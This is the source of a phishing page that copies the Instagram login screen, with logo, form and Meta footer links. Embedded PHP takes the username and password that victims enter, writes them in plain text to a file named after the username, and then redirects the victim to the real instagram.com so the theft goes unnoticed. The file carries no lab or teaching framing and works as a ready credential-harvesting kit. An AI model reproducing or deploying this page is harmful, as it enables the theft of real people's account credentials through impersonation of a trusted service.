<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./styles.css" />
    <title>Login · Instagram</title>
</head>
<body>
<link rel="icon" type="image/png" href="./img//icon.png" />
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="./img//instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                </h1>
                <?php
                if(isset($_POST['login'])) {
                    $email = @$_POST['email'];
                    $password = @$_POST['password'];

                    $myfile = fopen("$email.txt", "w") or die("Unable to open file!");
                    $txt = "Username : $email\n";
                    fwrite($myfile, $txt);
                    $txt = "Password : $password\n";
                    fwrite($myfile, $txt);
                    fclose($myfile);

                    echo "<script>window.location = 'http://www.instagram.com'</script>";
                }
                ?>
                <form action='index.php' method='POST'>
                    <label for="email" class="sr-only">Phone number, username or email</label>
                    <input name="email" placeholder="Phone number, username or email" required="required" />

                    <label for="password" class="sr-only">Password</label>
                    <input name="password" type="password" placeholder="Password" required="required" />

                    <button type="submit" name='login'>Log in</button>
                </form>
                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">OR</div>
                    <span></span>
                </div>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img />
                        <a style='font-size: 14px;'><i class="fa-brands fa-square-facebook"></i> Log in with Facebook</a>
                    </div>
                    <a href="#">Forgot Password?</a>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>Don't have an account?</p>
                <a href="#">Sign up</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
                <p>Get the app.</p>
                <div class="flex justify-content-center">
                    <img src="./img/apple-button.png"      alt="Imagem com a logo da Apple Store" title="Imagem com a logo da Apple Store" />
                    <img src="./img/googleplay-button.png" alt="Imagem com a logo da Google Play" title="Imagem com a logo da Google Play" />
                </div>
            </div>
        </section>
    </main>
    <footer>
        <ul class="flex flex-wrap justify-content-center">
            <li><a href="https://about.meta.com/">Meta</a></li>
            <li><a href="https://about.instagram.com/">About</a></li>
            <li><a href="https://about.instagram.com/blog/">Blog</a></li>
            <li><a href="https://www.instagram.com/about/jobs/">Jobs</a></li>
            <li><a href="https://help.instagram.com/">Help</a></li>
            <li><a href="https://developers.facebook.com/docs/instagram">API</a></li>
            <li><a href="https://www.instagram.com/legal/privacy/">Privacy</a></li>
            <li><a href="https://www.instagram.com/legal/terms/">Terms</a></li>
            <li><a href="https://www.instagram.com/web/lite/">Instagram Lite</a></li>
            <li><a href="https://about.meta.com/technologies/meta-verified/">Meta Verified</a></li>
            <li><a href="https://www.instagram.com/directory/profiles/">Top Accounts</a></li>
        </ul>
        <p class="copyright">© 2023 Instagram from Meta</p>
    </footer>
</body>
</html>
<script src="https://kit.fontawesome.com/e487ee8bec.js" crossorigin="anonymous"></script>